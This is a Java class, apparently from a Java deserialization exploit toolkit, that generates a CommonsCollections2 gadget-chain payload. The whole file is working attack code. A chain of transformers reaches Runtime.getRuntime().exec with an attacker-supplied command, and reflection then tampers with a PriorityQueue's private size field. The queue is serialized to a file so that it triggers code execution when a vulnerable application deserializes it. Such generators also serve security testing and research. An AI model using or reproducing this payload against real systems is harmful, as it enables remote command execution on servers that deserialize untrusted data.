package com.exp.collections;


import com.constant.PayloadGenerator;
import org.apache.commons.collections4.Transformer;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.ChainedTransformer;
import org.apache.commons.collections4.functors.ConstantTransformer;
import org.apache.commons.collections4.functors.InvokerTransformer;

import java.io.File;
import java.lang.reflect.Modifier;
import java.util.PriorityQueue;

public class CommonsCollections2 extends PayloadGenerator {
    @Override
    protected File generatorPayload(String[] cmd) {
        ChainedTransformer currentChainedTransformer = new ChainedTransformer(new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]}),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}),
                new InvokerTransformer("exec", new Class[]{String[].class}, new Object[]{cmd})});
        TransformingComparator transformingComparator = new TransformingComparator(currentChainedTransformer);
        PriorityQueue<Object> queue = new PriorityQueue(transformingComparator);
        setValueByField("size",queue,0, Modifier.PRIVATE);
        queue.add(1);
        setValueByField("size",queue,0, Modifier.PRIVATE);
        queue.add(2);
        setValueByField("size",queue,2, Modifier.PRIVATE);
        return serializable(queue);
    }

}
